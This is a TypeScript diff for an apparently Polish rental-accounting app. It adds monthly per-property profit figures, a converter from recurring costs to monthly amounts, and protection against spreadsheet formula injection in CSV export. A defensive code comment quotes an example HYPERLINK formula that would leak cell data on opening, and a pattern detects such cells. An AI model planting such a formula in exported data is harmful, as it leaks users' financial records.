@@ -10,6 +10,7 @@
  * po dacie wystawienia dokumentu nie zgadzałoby się z zeznaniem.
  */
 
+import type { ExpenseRecurrence } from "@/generated/prisma/enums";
 import type { Locale } from "@/lib/i18n/config";
 import { monthNames } from "@/lib/i18n/format";
 
@@ -64,7 +65,43 @@ export type PropertyRow = {
   incomeGrosze: number;
   expenseGrosze: number;
   profitGrosze: number;
+  /** Stan na dziś, nie za wybrany rok: aktywne umowy i koszty cykliczne. */
+  monthlyIncomeGrosze: number;
+  monthlyExpenseGrosze: number;
+  monthlyProfitGrosze: number;
 };
+
+/** Kwota miesięczna przypisana do nieruchomości — bez daty, bo to stan bieżący. */
+export type MonthlyEntry = {
+  amountGrosze: number;
+  propertyId: string | null;
+};
+
+const DAYS_PER_MONTH = 365 / 12;
+
+/**
+ * Koszt cykliczny przeliczony na miesiąc.
+ *
+ * Tygodniowy i „co N dni" idą przez średnią długość miesiąca, a nie przez
+ * cztery tygodnie: 4 × 7 dni to 28, więc koszt tygodniowy wyszedłby o mniej
+ * więcej jedną dwunastą za nisko.
+ */
+export function monthlyCost(
+  amountGrosze: number,
+  recurrence: ExpenseRecurrence,
+  everyDays: number | null,
+): number {
+  switch (recurrence) {
+    case "MONTHLY":
+      return amountGrosze;
+    case "YEARLY":
+      return Math.round(amountGrosze / 12);
+    case "WEEKLY":
+      return Math.round((amountGrosze * DAYS_PER_MONTH) / 7);
+    case "CUSTOM":
+      return Math.round((amountGrosze * DAYS_PER_MONTH) / Math.max(1, everyDays ?? 1));
+  }
+}
 
 /**
  * Wynik w rozbiciu na nieruchomości.
@@ -79,6 +116,10 @@ export function propertyBreakdown(
   expenses: readonly CashEntry[],
   names: ReadonlyMap<string, string>,
   labels: { deletedProperty: string; generalCosts: string },
+  monthly: { income: readonly MonthlyEntry[]; expenses: readonly MonthlyEntry[] } = {
+    income: [],
+    expenses: [],
+  },
 ): PropertyRow[] {
   const rows = new Map<string, PropertyRow>();
 
@@ -93,6 +134,9 @@ export function propertyBreakdown(
       incomeGrosze: 0,
       expenseGrosze: 0,
       profitGrosze: 0,
+      monthlyIncomeGrosze: 0,
+      monthlyExpenseGrosze: 0,
+      monthlyProfitGrosze: 0,
     };
     rows.set(key, row);
     return row;
@@ -100,8 +144,15 @@ export function propertyBreakdown(
 
   for (const entry of income) bucket(entry.propertyId).incomeGrosze += entry.amountGrosze;
   for (const entry of expenses) bucket(entry.propertyId).expenseGrosze += entry.amountGrosze;
+  // Nieruchomość wynajęta od tego miesiąca nie ma jeszcze ruchu w roku,
+  // ale w kolumnach bieżących powinna już stać.
+  for (const entry of monthly.income) bucket(entry.propertyId).monthlyIncomeGrosze += entry.amountGrosze;
+  for (const entry of monthly.expenses) bucket(entry.propertyId).monthlyExpenseGrosze += entry.amountGrosze;
 
-  for (const row of rows.values()) row.profitGrosze = row.incomeGrosze - row.expenseGrosze;
+  for (const row of rows.values()) {
+    row.profitGrosze = row.incomeGrosze - row.expenseGrosze;
+    row.monthlyProfitGrosze = row.monthlyIncomeGrosze - row.monthlyExpenseGrosze;
+  }
 
   // Najpierw nieruchomości wg zysku malejąco, koszty ogólne zawsze na końcu —
   // to nie jest nieruchomość, więc nie konkuruje z nimi w rankingu.
@@ -190,8 +241,21 @@ export function toCsvAmount(grosze: number, locale: Locale = "pl"): string {
  * i polskie znaki zamieniają się w krzaki.
  */
 export function buildCsv(headers: readonly string[], rows: readonly (readonly string[])[]): string {
-  const escape = (cell: string) =>
-    /[";\n]/.test(cell) ? `"${cell.replace(/"/g, '""')}"` : cell;
+  /*
+    Komórka zaczynająca się od `=`, `+`, `-` albo `@` jest dla Excela formułą.
+    W pliku lądują teksty wpisane przez innych ludzi — nazwa płatnika, opis
+    kosztu, tytuł przelewu — więc `=HYPERLINK("https://…?"&A1;"Faktura")`
+    zamieniłby otwarcie raportu w wyciek danych. Apostrof na początku każe
+    Excelowi czytać komórkę jako tekst. Kwoty zostają nietknięte: ujemna
+    liczba też zaczyna się od minusa, a musi dać się zsumować.
+  */
+  const neutralize = (cell: string) =>
+    /^[=+\-@\t\r]/.test(cell) && !/^-?\d+(?:[.,]\d+)?$/.test(cell) ? `'${cell}` : cell;
+
+  const escape = (raw: string) => {
+    const cell = neutralize(raw);
+    return /[";\r\n]/.test(cell) ? `"${cell.replace(/"/g, '""')}"` : cell;
+  };
 
   const lines = [headers, ...rows].map((row) => row.map(escape).join(";"));
   return `﻿${lines.join("\r\n")}\r\n`;
